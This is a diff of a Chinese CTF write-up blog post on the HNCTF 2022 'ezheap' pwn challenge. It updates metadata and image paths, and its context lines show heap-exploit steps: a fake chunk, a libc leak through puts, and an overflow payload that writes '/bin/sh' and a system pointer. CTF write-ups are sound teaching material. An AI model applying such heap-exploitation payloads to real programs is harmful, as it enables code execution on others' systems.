@@ -1,12 +1,10 @@
 ---
-title: '{文件名}'
-date: 2024-11-11 13:00:00 +0800
-categories: [uaf,malloc_hook,unsortbin_leaklibc]
+title: '[HNCTF 2022 WEEK4]ezheap'
+date: 2024-04-28 13:00:00 +0800
+categories: [uaf,off_by_one,heapoverflow,leak_libc]
 tags: [ctf,pwn]
 ---
  [[HNCTF 2022 WEEK4](https://www.nssctf.cn/problem/3104)]ezheap
-
-`Off-By-One`|`堆溢出`|`leak_libc`
 
 ```shell
 [*] '/home/bamuwe/ezheap/ezheap'
@@ -155,11 +153,11 @@ def edit(idx,size,text):
 
 1. `add()`时会添加两个`chunk`，`chunk1`存贮`name`，正文`chunk`和`puts()`的地址，即`0x0a27656d616e2762(name)`，`0x0000561b7af6c040`，`0x00007f483b7215d0(puts_addr)`另`chunk2`存贮`text`
 
-   ![image-20240428142620769](./../../AppData/Roaming/Typora/typora-user-images/image-20240428142620769.png)
+   ![image-20240428142620769](../assets/img/old_imgs/image-20240428142620769.png)
 
 2. `show()`会调用`chunk1`中预存的`puts()`构造`puts(chunk2_addr)`实现打印输出
 
-   ![image-20240428143340351](./../../AppData/Roaming/Typora/typora-user-images/image-20240428143340351.png)
+   ![image-20240428143340351](../assets/img/old_imgs/mage-20240428143340351.png)
 
 利用思路：
 
@@ -175,7 +173,7 @@ def edit(idx,size,text):
    free(1)
    ```
 
-   ![image-20240428144611332](./../../AppData/Roaming/Typora/typora-user-images/image-20240428144611332.png)
+   ![image-20240428144611332](../assets/img/old_imgs/image-20240428144611332.png)
 
    > 成功构造出fake_chunk
 
@@ -195,7 +193,7 @@ def edit(idx,size,text):
    success('&puts=>{}'.format(hex(puts_addr)))
    ```
 
-   ![image-20240428151019745](./../../AppData/Roaming/Typora/typora-user-images/image-20240428151019745.png)
+   ![image-20240428151019745](../assets/img/old_imgs/image-20240428151019745.png)
 
 3. 通过`edit()`修改，利用堆溢出修改其他`chunk`
 
@@ -203,7 +201,7 @@ def edit(idx,size,text):
    edit(4,0x100,b'a'*0x40+p64(0)+p64(0x31)+b'/bin/sh\x00'+p64(0)*2+p64(0x1)+p64(sys_addr))
    ```
 
-   ![image-20240428151224698](./../../AppData/Roaming/Typora/typora-user-images/image-20240428151224698.png)
+   ![image-20240428151224698](../assets/img/old_imgs/image-20240428151224698.png)
 
    > 修改后，可以与上面比较一下
 
